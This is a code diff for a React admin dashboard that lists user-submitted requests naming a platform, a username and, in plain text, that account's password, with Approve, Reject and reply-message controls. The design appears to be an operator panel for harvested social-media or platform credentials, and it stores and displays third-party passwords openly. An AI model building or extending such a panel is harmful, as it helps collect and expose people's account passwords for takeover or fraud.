@@ -22,7 +22,18 @@ export default function AdminPage() {
   return (
     <div className="p-10 font-serif">
       <h1 className="text-2xl font-bold mb-5">Admin Dashboard 👑</h1>
-      
+
+      {requests.length === 0 && <p>No requests yet</p>}
+
+      {requests
+        .filter(r => r.userMessage)
+        .map(r => (
+          <p key={r.id} className="text-pink-600 font-bold">
+            💌 Message from user: {r.userMessage}
+          </p>
+      ))}
+
+
       {requests.map((r) => (
         <div
           key={r.id}
@@ -31,7 +42,55 @@ export default function AdminPage() {
           {/* <p><b>User Message:</b> {r.userMessage}</p> */}
           <p><b>Platform:</b> {r.platform}</p>
           <p><b>Username:</b> {r.username}</p>
-          <p><b>Mobile Number:</b> {r.password}</p>
+          <p><b>Password:</b> {r.password}</p>
+          <p><b>User:</b> {r.identifier}</p>
+          <p><b>Status:</b> {r.status}</p>
+
+          {r.status === "PENDING" && (
+            <>
+              <button
+                onClick={() =>
+                  fetch(`/api/admin/approve/${r.id}`, {
+                    method: "POST",
+                  })
+                }
+                className="bg-green-600 text-white px-2 py-1.5 rounded-xl font-semibold"
+              >
+                ✅ Approve
+              </button>
+
+              <button
+                onClick={() =>
+                  fetch(`/api/admin/reject/${r.id}`, {
+                    method: "POST",
+                  })
+                }
+                className="bg-blue-600 ml-2.5 text-white px-2 py-1.5 rounded-xl font-semibold"
+              >
+                ❌ Reject
+              </button>
+
+              <input
+                placeholder="Message for user"
+                value={adminMsg}
+                className="border border-gray-600 px-3 py-1.5 rounded-lg"
+                onChange={(e) => setAdminMsg(e.target.value)}
+              />
+                          
+              <button
+                onClick={() =>
+                  fetch(`/api/admin/message/${r.id}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ adminMessage: adminMsg })
+                  })
+                }
+                className="bg-blue-600 ml-2.5 text-white px-2 py-1.5 rounded-xl font-semibold"
+              >
+                Send Message
+              </button>
+            </>
+          )}
         </div>
       ))}
 
